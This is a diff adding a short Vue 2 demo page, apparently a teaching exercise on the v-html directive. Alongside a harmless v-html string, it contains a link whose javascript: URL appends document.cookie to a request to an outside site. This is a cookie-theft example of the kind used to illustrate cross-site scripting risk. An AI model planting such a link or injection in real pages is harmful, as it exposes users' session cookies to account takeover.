@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+  <script src="../../../../lib/vue2_6_14/vue.min.js"></script>
+</head>
+<body>
+  <div id="root">
+    {{name}}
+    <hr>
+    <div v-html="str"></div>
+    <a href='javascript:location.href="http://www.baidu.com?"+ document.cookie'>兄弟快点</a>
+  </div>
+  <script>
+    Vue.config.productionTip = false
+    
+    new Vue({
+      el: '#root',
+      data:{
+        name: '南图小学',
+        str: '<h4>xxxxx</h4>',
+        str2: ''
+      }
+    })
+  </script>
+</body>
+</html>
